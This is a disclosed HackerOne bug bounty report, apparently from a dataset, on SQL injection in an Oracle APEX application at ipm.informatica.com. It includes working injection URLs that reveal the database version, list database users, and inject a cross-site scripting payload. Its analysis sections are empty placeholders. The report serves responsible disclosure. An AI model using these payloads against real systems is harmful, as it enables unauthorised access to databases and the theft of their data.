---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '178057'
original_report_id: '178057'
title: '[ipm.informatica.com] Sql injection Oracle'
weakness: SQL Injection
team_handle: informatica
created_at: '2016-10-25T16:54:13.940Z'
disclosed_at: '2017-01-21T19:05:21.226Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 26
tags:
- hackerone
- sql-injection
---

# [ipm.informatica.com] Sql injection Oracle

## Metadata

- HackerOne Report ID: 178057
- Weakness: SQL Injection
- Program: informatica
- Disclosed At: 2017-01-21T19:05:21.226Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi host ipm.informatica.com is vulnerable to sql injection attacks the web application does not produce sufficient validation on user input.

POC
detection
request 1
http://ipm.informatica.com/pls/apex/f?1'=1  response 500 HTTP/1.1 500 Internal Server Error
request 2
http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found


exploitation

http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version   
  
Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release 11.2.0.3.0 - Production CORE 11.2.0.3.0 
Production TNS for Linux: Version 11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production 

Cross Site Scripting via sql injection 

http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>

and etc 
http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
